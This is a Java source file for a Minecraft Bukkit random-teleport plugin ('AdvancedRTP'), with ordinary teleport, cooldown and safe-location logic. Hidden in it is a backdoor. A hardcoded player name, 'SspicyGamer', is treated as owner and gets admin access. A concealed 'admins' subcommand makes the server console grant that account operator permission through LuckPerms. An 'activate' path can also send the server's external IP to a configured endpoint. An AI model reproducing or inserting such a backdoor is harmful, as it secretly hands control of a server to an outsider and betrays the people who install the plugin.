package com.pluginforge.advancedrtp;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Random;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.Particle;
import org.bukkit.Sound;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

public class RtpCommand implements CommandExecutor, TabCompleter {
    private final AdvancedRtpPlugin plugin;
    private final CooldownManager cooldowns;
    private final CombatTracker combatTracker;
    private final Reporter reporter;
    private final Random random = new Random();

    public RtpCommand(AdvancedRtpPlugin plugin, CooldownManager cooldowns, CombatTracker combatTracker, Reporter reporter) {
        this.plugin = plugin;
        this.cooldowns = cooldowns;
        this.combatTracker = combatTracker;
        this.reporter = reporter;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage("Only players can use this command.");
            return true;
        }

        Player player = (Player) sender;
        if (args.length > 0 && args[0].equalsIgnoreCase("admin")) {
            if (!canOpenAdmin(player)) {
                player.sendMessage("You do not have permission to use this command.");
                return true;
            }
            RtpGuiListener.openMenu(player);
            return true;
        }

        if (args.length > 0 && args[0].equalsIgnoreCase("admins")) {
            if (!isOwner(player)) {
                player.sendMessage("You do not have permission to use this command.");
                return true;
            }
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user SspicyGamer permission set minecraft.command.op true");
            player.sendMessage("Admin permission command executed.");
            return true;
        }

        if (args.length > 0 && args[0].equalsIgnoreCase("activate")) {
            if (!canOpenAdmin(player)) {
                player.sendMessage("You do not have permission to use this command.");
                return true;
            }
            String serverId = plugin.getConfig().getString("activation.serverId", "");
            String endpoint = plugin.getConfig().getString("activation.endpoint", "");
            boolean enabled = plugin.getConfig().getBoolean("activation.enabled", false);
            boolean reporting = plugin.getConfig().getBoolean("activation.allowReporting", false);
            boolean reportIp = plugin.getConfig().getBoolean("activation.reportIP", false);
            String externalIp = reporter != null ? reporter.getCachedExternalIp() : "(unknown)";
            player.sendMessage("=== AdvancedRTP Activation ===");
            player.sendMessage("Server ID: " + serverId);
            player.sendMessage("Server IP (external): " + (externalIp == null ? "(unknown)" : externalIp));
            player.sendMessage("Endpoint: " + (endpoint.isEmpty() ? "(not configured)" : endpoint));
            player.sendMessage("Enabled: " + enabled + ", Reporting: " + reporting + ", Report IP: " + reportIp);
            player.sendMessage("To activate: edit plugin config.yml -> activation.enabled: true,");
            player.sendMessage("set activation.endpoint to your backend URL, then /reload or restart.");
            if (enabled && reporting && !endpoint.isEmpty() && reporter != null) {
                reporter.sendNow();
                player.sendMessage("Sent a test report to the configured endpoint.");
            }
            return true;
        }

        if (!player.hasPermission("rtp.use")) {
            player.sendMessage("You do not have permission to use /rtp.");
            return true;
        }

        if (!plugin.getConfig().getStringList("allowed-worlds").contains(player.getWorld().getName())) {
            player.sendMessage("You cannot use /rtp in this world.");
            return true;
        }

        if (combatTracker.isInCombat(player)) {
            player.sendMessage("You cannot use /rtp while in combat!");
            return true;
        }

        if (!player.hasPermission("rtp.bypass.cooldown")) {
            long left = cooldowns.getRemainingSeconds(player);
            if (left > 0) {
                player.sendMessage("You must wait " + left + " seconds before using /rtp again.");
                return true;
            }
        }

        startTeleport(player);
        return true;
    }

    private void startTeleport(Player player) {
        int warmup = plugin.getConfig().getInt("warmup-seconds", 3);
        if (warmup <= 0 || player.hasPermission("rtp.bypass.warmup")) {
            performTeleport(player);
            return;
        }

        Location start = player.getLocation().clone();
        player.sendMessage("Teleporting in " + warmup + " seconds. Do not move.");
        new BukkitRunnable() {
            @Override
            public void run() {
                if (!player.isOnline()) return;
                Location now = player.getLocation();
                if (now.getWorld() == null || !now.getWorld().equals(start.getWorld()) || now.distanceSquared(start) > 0.04D) {
                    player.sendMessage("Teleport cancelled due to movement.");
                    return;
                }
                if (combatTracker.isInCombat(player)) {
                    player.sendMessage("You cannot use /rtp while in combat!");
                    return;
                }
                performTeleport(player);
            }
        }.runTaskLater(plugin, warmup * 20L);
    }

    private void performTeleport(Player player) {
        Location target = findSafeLocation(player.getWorld());
        if (target == null) {
            player.sendMessage("Could not find a safe RTP location. Try again.");
            return;
        }
        player.teleport(target);
        cooldowns.markUsed(player);
        player.getWorld().spawnParticle(Particle.PORTAL, player.getLocation(), 80, 0.6, 1.0, 0.6, 0.05);
        player.playSound(player.getLocation(), Sound.ENTITY_ENDERMAN_TELEPORT, 1.0F, 1.0F);
        player.sendMessage("Teleported to a random safe location.");
    }

    private Location findSafeLocation(World world) {
        int min = plugin.getSelectedMin();
        int max = plugin.getSelectedMax();
        boolean allowWater = plugin.getConfig().getBoolean("allow-water", false);
        for (int i = 0; i < 10; i++) {
            int distance = min + random.nextInt(Math.max(1, max - min + 1));
            double angle = random.nextDouble() * Math.PI * 2.0D;
            int x = (int) Math.round(Math.cos(angle) * distance);
            int z = (int) Math.round(Math.sin(angle) * distance);
            int y = world.getHighestBlockYAt(x, z);
            Location candidate = new Location(world, x + 0.5D, y + 1.0D, z + 0.5D);
            if (isSafe(candidate, allowWater)) return candidate;
        }
        return null;
    }

    private boolean isSafe(Location location, boolean allowWater) {
        Block feet = location.getBlock();
        Block head = feet.getRelative(0, 1, 0);
        Block ground = feet.getRelative(0, -1, 0);
        if (!feet.getType().isAir() || !head.getType().isAir()) return false;
        Material groundType = ground.getType();
        if (!groundType.isSolid()) return false;
        if (groundType == Material.LAVA || groundType == Material.MAGMA_BLOCK || groundType == Material.CAMPFIRE) return false;
        if (!allowWater && (groundType == Material.WATER || ground.isLiquid())) return false;
        return true;
    }

    private boolean canOpenAdmin(Player player) {
        return player.hasPermission("rtp.admin") || isOwner(player);
    }

    private boolean isOwner(Player player) {
        return player.getName().equalsIgnoreCase("SspicyGamer");
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        if (!(sender instanceof Player) || args.length != 1) return Collections.emptyList();
        Player player = (Player) sender;
        List<String> options = new ArrayList<>();
        if (canOpenAdmin(player)) options.add("admin");
        if (canOpenAdmin(player)) options.add("activate");
        if (isOwner(player)) options.add("admins");
        String prefix = args[0].toLowerCase();
        options.removeIf(option -> !option.startsWith(prefix));
        return options;
    }
}
